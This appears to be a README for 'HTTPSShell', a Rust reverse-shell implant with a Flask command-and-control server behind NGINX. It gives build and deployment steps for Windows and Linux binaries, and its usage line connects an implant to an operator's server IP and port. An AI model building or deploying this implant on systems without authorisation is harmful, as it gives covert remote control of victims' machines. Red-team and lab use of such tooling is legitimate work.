# HTTPSShell

Tested docker build in kali.

Requirements and preperation:
------------------
1. NGINX on the host: https://nginx.org/en/linux_packages.html 
2. python3 and venv on the host: https://virtualenv.pypa.io/en/latest/installation.html 
3. Back up the existing nginx.conf file.
4. Move the nginx.conf file from this repo into /etc/nginx/nginx.conf.
5. Create a key and certificate:
It's generally recommended to avoid self-signed certificates. Only do this for using in a test environment.
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:4096 -nodes -sha256
```
6. Place the pem file in /etc/nginx/cert/server.pem.
7. Create a virtual environment for the C2 server:
```
mkdir controlServer
python3 -m venv controlServer
cd controlServer
source bin/activate
pip3 install colorama flask
flask run
```

Setup:
----
1. Run docker build in directory with Dockerfile:
```
docker build .
```
2. Run container (use -v flag to mount directories as desired):
```
docker run -di [imageID]
```
3. Enter container:
```
docker exec -ti [containerID] /bin/bash
```
4. From within container, Clone repo:
```
git clone https://github.com/Business1sg00d/RustHTTPSShell.git /opt/RustHTTPSShell
cd /opt/RustHTTPSShell
```
5. From within container, add windows support:
```
rustup target add x86_64-pc-windows-gnu
```

Building from within container:
-----
When building for windows use:
```
cargo build --target x86_64-pc-windows-gnu --bin main_windows
```

For linux use:
```
cargo build
```

Binaries are in "target" directory from within project directory

Usage:
--
For both Windows and Linux version:
```
.\binary.exe [Your_Server_IP] [Your_Server_port}
./binary [Your_Server_IP] [Your_Server_port}
```
